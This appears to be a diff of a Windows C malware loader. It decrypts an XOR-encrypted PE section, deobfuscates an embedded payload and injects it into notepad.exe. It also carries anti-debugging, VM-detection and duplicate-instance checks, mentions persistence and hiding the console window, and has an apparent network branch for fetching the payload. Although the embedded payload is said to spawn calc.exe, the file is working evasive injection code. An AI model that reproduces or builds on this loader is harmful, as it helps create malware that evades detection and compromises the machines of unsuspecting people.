@@ -1,9 +1,10 @@
 #include <Windows.h>
 #include <stdio.h>
-#include "payload.h"
+#include "injector.h"
 #include "config.h"
 #include <time.h>
-#include "low-entropy-payload.h"
+#include "payload.h"
+//#include "string_decrypt.h"
 //#include "VM-detect.h"
 #include "debugger-detect.h"
 BOOL IsDuplicate()
@@ -53,43 +54,69 @@ BOOL IsDuplicate()
     return FALSE;
 }
 
-void DecryptRDataSection()
-{
-    LPVOID procbase = GetModuleHandleA(NULL);
-    DWORD signature = 0xaabbccdd;
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)procbase;
-    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((char *) procbase + dosHeader->e_lfanew);
-    PIMAGE_SECTION_HEADER currentSection = IMAGE_FIRST_SECTION(ntHeaders);
-    for(int i =0 ; i < ntHeaders->FileHeader.NumberOfSections; ++i)
-    {
-        if (*((DWORD64*) currentSection->Name) == 0x61746164722e){
-            // printf("found\n");
-            break;
-        }   
-        ++currentSection;
-    }
-    
-    int sectionSize = currentSection->Misc.VirtualSize; 
-    DWORD * addr = (DWORD *)((char*) procbase + currentSection->VirtualAddress);
-    DWORD oldProtect = PAGE_READONLY;
-    VirtualProtect(addr, sectionSize, PAGE_READWRITE, &oldProtect);
-        // printf("Worked\n");
-    // printf("decrypting\n");
-    for(int i = 0; i < 0xa00; i += 4)
-    {
-        *addr ^= signature;
-        ++addr;
-    }
-    oldProtect = PAGE_READWRITE;
-    //VirtualProtect(addr, sectionSize, PAGE_READONLY, &oldProtect);
-}
 
-int BUFFER_Size = 205;
+
+//int BUFFER_Size = sizeof(embeded_payload);
 
 void RemoveEntropy()
 {
-    for (int i = 0; i < BUFFER_Size; i++)
-        embeded_payload[i] = embeded_payload[i] ^ (embeded_payload[i + BUFFER_Size] << 4);
+    for (int i = 0; i < BUFFER_Size /2; i++)
+        embeded_payload[i] = (embeded_payload[i] << 4) ^ embeded_payload[i + (BUFFER_Size / 2)];
+
+}
+LPVOID getcurProcBaseAddr()
+{
+    PPEB peb;
+#ifdef _WIN64
+    peb = (PPEB)__readgsqword(0x60);
+#endif
+    return (LPVOID)peb->ImageBaseAddress;
+}
+
+
+void decrypt()
+{
+    LPVOID procbase = getcurProcBaseAddr();
+    DWORD signature = 0xaabbccdd;
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)procbase;
+    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((char*)procbase + dosHeader->e_lfanew);
+    PIMAGE_SECTION_HEADER currentSection = IMAGE_FIRST_SECTION(ntHeaders);
+    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i)
+    {
+        if (*((DWORD64*)currentSection->Name) == 0x656d616e662e) {
+            // printf("found\n");
+            break;
+        }
+        ++currentSection;
+    }
+
+    int sectionSize = currentSection->SizeOfRawData;
+    PVOID addr = (PVOID)((char*)procbase + currentSection->VirtualAddress);
+    //ULONG oldProtect = PAGE_READONLY;
+
+    //NTSTATUS check = NtProtectVirtualMemory((HANDLE)-1, (PVOID*)( & addr), (PSIZE_T)&sectionSize, PAGE_READWRITE, (PULONG)&oldProtect);
+    //if (check)
+    //{
+    //    exit(0);
+    //}
+    //VirtualProtect(addr, sectionSize, PAGE_READWRITE, &oldProtect);
+    // printf("Worked\n");
+// printf("decrypting\n");
+    DWORD* tmp = (DWORD*)addr;
+    for (int i = 0; i < sectionSize ; i += 4)
+    {
+        *tmp ^= signature;
+        ++tmp;
+    }
+    //oldProtect = PAGE_READWRITE;
+    printf("[+] Successfully decrypt section!\n");
+
+    //check = NtProtectVirtualMemory((HANDLE)-1, (PVOID*)( & addr), (PSIZE_T)&sectionSize, PAGE_READONLY, (PULONG)&oldProtect);
+    //if (check == 0)
+    //{
+    //    printf("[+] Successfully decrypt rdata section!\n");
+    //}
+    //VirtualProtect(addr, sectionSize, PAGE_READONLY, &oldProtect);
 }
 
 int main()
@@ -98,14 +125,12 @@ int main()
     //HWND window = GetConsoleWindow();
     //ShowWindow(window, SW_HIDE);
 
-    //DecryptRDataSection();
-
+    decrypt();
+    //printf("GetModuleHandleA: %p, getcurprocbaseaddr: %p\n", GetModuleHandleA(NULL), getcurProcBaseAddr());
     if (IsDuplicate()) { 
         exit(0); 
     }
-    
-    srand((int)time(0));
-
+    srand((int)time(0));   
     // #ifdef DEBUG
     // char logpath[MAX_PATH];
     // GetCurrentProcessDirectory(logpath, MAX_PATH);
@@ -121,33 +146,34 @@ int main()
     //     #endif // DEBUG
     //     exit(0);
     // }
-    // else
+    // else    
     // {
     //     #ifdef DEBUG
     //     printf("[+] VM has not been detected! Operation continue!\n");
     //     #endif
     // }
 
-    if (CheckDebugPresentBit() || CheckNTGlobalFlag())
-    {
-#ifdef DEBUG
-        printf("[x] Debugger has been detected, operation abort!\n");
-        exit(0);
-#endif
-    }
-    else
-    {
-#ifdef DEBUG
-        printf("[+] No debugger has been detected, operation continue!\n");
-#endif
-    }
+//    if (CheckDebugPresentBit() || CheckNTGlobalFlag())
+//    {
+//#ifdef DEBUG
+//        printf("[x] Debugger has been detected, operation abort!\n");
+//        exit(0);
+//#endif
+//    }
+//    else
+//    {
+//#ifdef DEBUG
+//        printf("[+] No debugger has been detected, operation continue!\n");
+//#endif
+//    }
+
 
     #ifdef DEBUG
     printf("[.] Waiting for notepad.exe\n");
     #endif
 
     DWORD targetpid = 0;
-
+    
     //printf("Enter target pid: ");
     //scanf("%ud", &targetpid);
     while (targetpid == 0)
@@ -168,7 +194,9 @@ int main()
     // RunEdit(); /// add persistence
 
     #ifdef PAYLOAD_EMBED    // spawn calc.exe
+    RemoveEntropy();
     payload = embeded_payload;
+    BUFFER_Size = BUFFER_Size / 2;
     //RemoveEntropy();      //deobfuscate payload
     #else
     SOCKET pSocket;
